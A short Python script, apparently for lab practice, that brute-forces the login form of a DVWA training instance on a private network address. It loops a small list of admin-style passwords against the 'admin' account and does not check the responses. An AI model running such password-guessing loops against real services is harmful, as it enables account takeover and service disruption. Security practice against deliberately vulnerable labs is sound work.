import requests
passwords=['admin1','admin2','admin3','admin5','admin6','admin8','admin9','admin','admin10']
for i in range(100):
    for password in passwords: 
        url='http://192.168.25.216/dvwa/vulnerabilities/brute/'
        payload={'username':'admin','password': password,'Login':'Login'}
        r=requests.get(url,params=payload)
        
